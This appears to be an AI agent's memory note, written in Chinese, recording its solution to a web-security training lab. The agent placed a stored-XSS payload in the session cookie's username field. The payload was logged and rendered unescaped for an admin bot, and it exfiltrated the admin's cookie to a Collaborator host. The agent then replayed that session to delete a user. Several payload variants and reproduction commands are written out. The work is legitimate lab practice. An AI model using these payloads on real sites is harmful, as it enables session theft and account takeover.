---
metadata:
  node_type: memory
name: "PRS lab solve scanning-non-standard-data-structures"
description: "sn-9 solved: cookie username half -> integrity-violation LOG -> /admin/logs renders it unescaped -> admin bot XSS -> steal admin session -> delete carlos"
last_updated: 2026-10-13T00:15:25+08:00
created: 2026-10-13T00:15:25+08:00
---

## 2026-10-12 sn-9 solved (lab-scanning-non-standard-data-structures)

**判定: solved** — banner_verdict 落盘 `/tmp/sn9-verdict.json`(`solved:true`,`Congratulations, you solved the lab!`)。实例 `https://0ae700a8030fd57283e1329200b40023.web-security-academy.net`。

### 机制(全链已实证,推翻本件此前"stuck"结论)

"非标准数据结构" = 会话 cookie `session=<username>%3a<32位base62 token>` 的 **username 半**。它不是反射型 XSS,而是**日志型存储 XSS**:

1. `GET /my-account?id=wiener` 携带 `Cookie: session=<PAYLOAD>%3a<原 sid>` → app 的完整性校验失败,**把 URL 解码后的 username 半原样写进请求日志**:`Integrity violation detected from <PAYLOAD>`。响应对我们仍是 500(载荷无关,digest 恒定 `aa136edf6af38e3e`)——所以"注入被 500 挡住"是**错误判读**:500 正是注入成功的表现。
2. 管理员会话的 `/admin/logs` 视图把每条日志**未转义**渲染进 `<div>`:
   `<div>Integrity violation detected from <script>fetch('//<collab>/'+document.cookie)</script></div>` → 存储 XSS。
3. 实验室模拟受害者(UA `Mozilla/5.0 (Victim) … Chrome/154.0.0.0`,Referer = 实例根)约 60-90s 后访问日志 → 载荷执行 → `document.cookie` 外带到 Collaborator(burp_collab 实测 10 条交互,其中 6 条 https fetch 携带 URL path=`session=administrator%3a<token>; secret=…`)。
4. 重放 `session=administrator%3amMnbchDkOT5odcymj43Yo1cUo1cDUDmQ` → `/admin` 200(面板列出 wiener/carlos 的 `Delete` 链)→ `GET /admin/delete?username=carlos`(GET,**无需 csrf**)→ 横幅翻牌。

### 每次投递的往返账(单次 raw_matrix 8 变体)

形 A `<script>fetch(...)`、形 B `<script>import(...)`、形 C `<img src=x onerror=fetch(...)>`、形 D `<svg onload=fetch(...)>` 四形全部 **500 / 2480B / digest `aa136edf6af38e3e` / marker_hit=false**;`?id=<载荷>` 形 → 302 `/login`;控制组 → 200。**全部四形都在日志里命中并全部被受害者浏览器执行**(日志页可见四条完整载荷)——交互计数 = 4/4 形命中(载荷不同、信道同一)。

### 会话/cookie 语义(钉死,供后续题复用)

- cookie = `<username>%3a<token>`;app 以 token 查会话记录,再要求 cookie 的 username **逐字节等于**该记录的 username;不等 → 500 `Integrity violation detected`;token 未知 → 302 `/login`。`?id=` 必须逐字节等于会话 username,否则 302。
- 无 canonical-form 窗口:大小写/空格/制表/NUL/`%00`/截尾/追加、重复 cookie(后者胜)、双 Host、参数污染、未知 token + 特权 username(不创建会话)、login 表单 username(严格查库,"Invalid username or password")**全部**不改语义。
- **关键教训:本题的"注入成功"以服务端日志为判据,不以响应为判据。** 后续同族题:响应恒 500 且 digest 与载荷无关时,先找 `logs/audit/admin` 类只读面,而不是宣布死路。

### 会话寿命坑

实例为 lazy 容器,会话内存态会丢:同一 `wiener%3a<old sid>` 数分钟前 200、之后 POST 报 `Invalid CSRF token (session does not contain a CSRF token)` 并下发新匿名 cookie ⇒ 复用实例上先复验会话再谈归因。

### 复现命令

```
range_launch launch-url <lab-page-url> --jar /tmp/cj1.json
http_session get  <inst>/login --jar j          # csrf + 匿名 cookie(%3a<token>)
http_session post <inst>/login --form csrf=… --form username=wiener --form password=peter --jar j
raw_matrix @deliver.json                        # Cookie: session=<PAYLOAD>%3a<sid> → 500 即投递成功
nap 90 ; burp_collab poll                       # 受害者回带并执行,拿到 administrator%3a<token>
http_dump <inst>/admin --jar admin-jar          # 200 面板
http_dump <inst>/admin/delete?username=carlos --jar admin-jar   # 删号(注意末跳会被轮换成匿名)
banner_verdict <inst> --out <run>/verdict.json
http_dump <inst>/admin/logs --jar admin-jar     # 回看日志即注入留痕(自证)
```

